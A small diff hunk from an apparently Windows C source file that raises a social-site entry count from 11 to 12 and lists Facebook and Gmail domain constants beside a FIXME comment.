@@ -3,7 +3,7 @@
 #include <Windows.h>
 #pragma pack(1)
 
-#define SOCIAL_ENTRY_COUNT 11
+#define SOCIAL_ENTRY_COUNT 12
 
 #define FACEBOOK_DOMAIN L"facebook.com" // FIXME array-izza!
 #define GMAIL_DOMAIN	L"mail.google.com"
